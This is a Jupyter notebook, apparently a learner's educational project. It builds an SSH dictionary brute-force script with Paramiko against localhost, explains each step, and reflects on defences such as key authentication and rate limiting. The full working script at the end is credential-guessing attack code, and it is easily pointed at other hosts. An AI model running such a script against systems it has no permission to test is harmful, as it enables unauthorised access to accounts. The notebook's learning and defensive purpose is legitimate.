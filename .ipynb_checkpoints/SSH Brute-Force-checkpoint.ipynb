{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3ec3fd9c-eea7-4b44-8194-c57e3390e15c",
   "metadata": {},
   "source": [
    "# SSH Brute-Force with Paramiko and Pwntools\n",
    "\n",
    "In this project, I built a simple brute-force script to attempt SSH login using the `Paramiko` library in Python. The script tries a list of passwords (from `100k-most-used-passwords-NCSC.txt`) to find a valid credential for SSH login on a local machine. I also imported `Pwntools`, but it’s not heavily used here."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e08b411c-b710-4bee-ae88-911322041c7e",
   "metadata": {},
   "source": [
    "## Step 1: Imports and setting Up the SSH Client\n",
    "\n",
    "The first thing I needed to do was set up the SSH client. `Paramiko` is great for this because it allows you to interact with SSH servers easily. I started by importing `paramiko` and `pwn`, though I mainly used `paramiko` for the actual SSH work.\n",
    "\n",
    "I told the client to automatically accept any unknown host keys using AutoAddPolicy. This is important because when you connect to an SSH server for the first time, you usually get a warning about the server's SSH key not being recognized. By setting this policy, I avoid these errors during my brute-force attempt."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b5aac592-3ca1-4b28-869b-4269d44eda61",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import paramiko\n",
    "\n",
    "client = paramiko.SSHClient()\n",
    "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d73b11a5-05cc-40f9-88d9-d986a4d4e5d4",
   "metadata": {},
   "source": [
    "## Step 2: Open and strip each password in the password file\n",
    "\n",
    "I used a context manager (with open(...) as passwords_list) to open the file containing the password candidates.\n",
    "I enumerated through the list of passwords. Each time, I stripped the newline character and then used it in an attempt to connect to the SSH server with the client.connect() method."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "66baed33-de0e-4f88-a9e2-e824a269cd6a",
   "metadata": {},
   "outputs": [
    {
     "ename": "IndentationError",
     "evalue": "expected an indented block after 'with' statement on line 1 (242515931.py, line 2)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  Cell \u001b[0;32mIn[3], line 2\u001b[0;36m\u001b[0m\n\u001b[0;31m    for attempt, password in enumerate(passwords_list):\u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mIndentationError\u001b[0m\u001b[0;31m:\u001b[0m expected an indented block after 'with' statement on line 1\n"
     ]
    }
   ],
   "source": [
    "with open(\"100k-most-used-passwords-NCSC.txt\", \"r\") as passwords_list:\n",
    "for attempt, password in enumerate(passwords_list):\n",
    "    if attempt == 10:\n",
    "        break\n",
    "    password = password.strip(\"\\n\")\n",
    "    print(\"[{}] Attempting password: '{}' !\".format(attempt, password))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "88524a73-aef5-4b98-b60c-fdfd9f8325e5",
   "metadata": {},
   "source": [
    "## Step 3: Attempt each Password\n",
    "\n",
    "For each password in the list, I made an SSH connection attempt using:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a51c232-bb63-46f5-862e-33d1a8e41ff0",
   "metadata": {},
   "outputs": [],
   "source": [
    "client.connect(\n",
    "    hostname=\"127.0.0.1\",\n",
    "    port=22,\n",
    "    username=\"username\",\n",
    "    password=password,\n",
    "    timeout=1\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4d85e6d-5962-420b-b75d-63ef12a57c0f",
   "metadata": {},
   "source": [
    "## Step 4: If connection succeeded\n",
    "\n",
    "If the connection succeeded, it meant the password was correct, and I printed a success message and stopped further attempts by setting found_valid_password = True and breaking out of the loop."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4de460f-ed9a-482f-9936-14af385c59ef",
   "metadata": {},
   "outputs": [],
   "source": [
    "if found_valid_password:\n",
    "    print(\"[>] Valid password found: '{}'!\".format(password))\n",
    "    break"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fed14321-403d-4d4c-b2b0-ec77102a6c06",
   "metadata": {},
   "source": [
    "## Step 5: Handling exceptions\n",
    "\n",
    "A major part of the script was handling the different exceptions that could occur during each connection attempt. SSH connections might fail for various reasons, so I caught and handled a few common exceptions:\n",
    "\n",
    "paramiko.AuthenticationException: This is raised when the password is incorrect.\n",
    "\n",
    "paramiko.SSHException: This covers other SSH-related errors (e.g., transport issues).\n",
    "\n",
    "A general Exception to catch unexpected errors, like timeouts.\n",
    "\n",
    "This way, I ensured that the script wouldn’t crash on errors, and instead it would continue trying the next password."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bea6c07c-124f-48ec-ba77-930e51427d92",
   "metadata": {},
   "outputs": [],
   "source": [
    "except paramiko.AuthenticationException:\n",
    "    print(f\"[X] Invalid password: '{password}'\")\n",
    "except paramiko.SSHException as e:\n",
    "    print(f\"[!] SSH error: {e}\")\n",
    "except Exception as e:\n",
    "    print(f\"[!] Other error: {e}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c162903-fc11-48df-ac83-7e4de264593a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# At the end of each attempt, I made sure to close the SSH client to avoid resource leaks, using a finally block to ensure this happens no matter what.\n",
    "\n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2d079846-6ffd-45f6-a010-f278006e68ce",
   "metadata": {},
   "source": [
    "## Step 6: Outcome\n",
    "\n",
    "If a valid password was found during the loop, the script prints a success message and exits early. If no valid password was found after all attempts, it prints a message saying so."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b77f8b5-83b1-4822-baeb-34939d810999",
   "metadata": {},
   "source": [
    "## Lessons learned, reflections and conclusion\n",
    "\n",
    "What I Learned:\n",
    "\n",
    "Paramiko is a very straightforward library for interacting with SSH, making it easy to create simple brute-force scripts in Python for educational purposes.\n",
    "\n",
    "Real-World Relevance: This script is a good reminder of how attackers might use brute-force or dictionary attacks to gain unauthorized access to systems, especially if they can guess or find weak passwords.\n",
    "\n",
    "Security Measures: This project also highlighted the need for strong password policies, SSH key authentication, and defense mechanisms like lockout mechanisms and rate-limiting to prevent such attacks.\n",
    "\n",
    "Performance Considerations:\n",
    "Even with just 10 attempts in this example, it’s clear that brute-forcing takes time, especially with large wordlists. If I were trying to crack SSH credentials for a real attack, it would likely require optimizations like parallel processing or distributed cracking to speed things up.\n",
    "\n",
    "Exception Handling and Clean-Up:\n",
    "I also realised how important it is to handle exceptions properly in repeated connection attempts, as failing to do so can lead to resource leaks or misleading error states. This is why I included client.close() in the finally block after each attempt to ensure the connection is properly cleaned up.\n",
    "\n",
    "Conclusion\n",
    "This project was a hands-on way to explore SSH brute-forcing and password cracking techniques, and it really reinforced the importance of secure authentication practices. It also gave me a deeper understanding of how attackers might try to gain access to systems and how to defend against such methods."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb36a5a2-303f-4b66-8f24-1cefc2b448c5",
   "metadata": {},
   "source": [
    "# Full code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dc6a2c3-eae4-4ff0-9f93-2b3768b81100",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import paramiko\n",
    "\n",
    "client = paramiko.SSHClient()\n",
    "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "\n",
    "found_valid_password = False\n",
    "\n",
    "with open(\"100k-most-used-passwords-NCSC.txt\", \"r\") as passwords_list:\n",
    "    for attempt, password in enumerate(passwords_list):\n",
    "        if attempt == 10:\n",
    "            break\n",
    "        password = password.strip(\"\\n\")\n",
    "        print(\"[{}] Attempting password: '{}' !\".format(attempt, password))\n",
    "        try:\n",
    "            client.connect(\n",
    "                hostname=\"127.0.0.1\",\n",
    "                port=22,\n",
    "                username=\"username\",\n",
    "                password=password,\n",
    "                timeout=1\n",
    "            )\n",
    "\n",
    "            print(\"[>] Valid password found: '{}'!\".format(password))\n",
    "            found_valid_password = True\n",
    "            break\n",
    "        except paramiko.AuthenticationException:\n",
    "            print(f\"[X] Invalid password: '{password}'\")\n",
    "        except paramiko.SSHException as e:\n",
    "            print(f\"[!] SSH error: {e}\")\n",
    "        except Exception as e:\n",
    "            print(f\"[!] Other error: {e}\")\n",
    "        finally:\n",
    "            client.close()\n",
    "\n",
    "if not found_valid_password:\n",
    "    print(\"No valid password found in the list.\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
